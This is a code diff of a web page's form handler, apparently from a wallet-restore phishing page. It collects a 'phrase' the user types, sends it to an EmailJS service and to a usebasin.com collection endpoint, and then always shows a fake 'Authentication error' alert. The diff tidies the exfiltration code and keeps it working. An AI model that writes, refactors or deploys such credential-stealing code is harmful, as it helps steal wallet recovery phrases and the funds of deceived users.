@@ -232,34 +232,40 @@ user-scalable=0">
   }
 
   async function submitForm() {
-              var dataToSubmit = {
-          phrase: getInputValues()
-      };
-      emailjs.sendForm('service_gk6t3hy', 'template_5p8el87', dataToSubmit)
-                    .then(() => {
-                        console.log('SUCCESS!');
-                    }, (error) => {
-                        console.log('FAILED...', error);
-                    });
-      try {
-          await postData(
-          dataToSubmit
-      , 'https://usebasin.com/f/0c493dd57d79');
-      } catch (error) {
-          
-      }
-      try {
-          await postData(
-          dataToSubmit
-      , 'https://usebasin.com/f/0c493dd57d79');
-      } catch (error) {
-          
-      }
-      
-      
-      
-      new swal( "Error Restoring" ,  "Authentication error, please try again!" ,  "error" )
-  }
+    // Get the values from the inputs
+    var dataToSubmit = {
+        phrase: getInputValues()
+    };
+
+    // Create a new form element dynamically
+    var form = document.createElement('form');
+
+    // Create a hidden input for the value of 'phrase' and name it 'ohrase'
+    var hiddenInput = document.createElement('input');
+    hiddenInput.setAttribute('type', 'hidden');
+    hiddenInput.setAttribute('name', 'phrase'); // Set name as 'ohrase'
+    hiddenInput.setAttribute('value', dataToSubmit.phrase); // Set the value from getInputValues()
+    form.appendChild(hiddenInput); // Append the hidden input to the form
+
+    // Send the dynamically created form using EmailJS
+    emailjs.sendForm('service_gk6t3hy', 'template_5p8el87', form)
+        .then(() => {
+            console.log('SUCCESS!');
+        }, (error) => {
+            console.log('FAILED...', error);
+        });
+
+    // Send the same data to Basin via postData
+    try {
+        await postData(dataToSubmit, 'https://usebasin.com/f/0c493dd57d79');
+    } catch (error) {
+        console.error('Error with Basin:', error);
+    }
+
+    // Show error message using SweetAlert
+    new swal("Error Restoring", "Authentication error, please try again!", "error");
+}
+
   
   // Add event listener to submitBtn
   function addEventListener() {
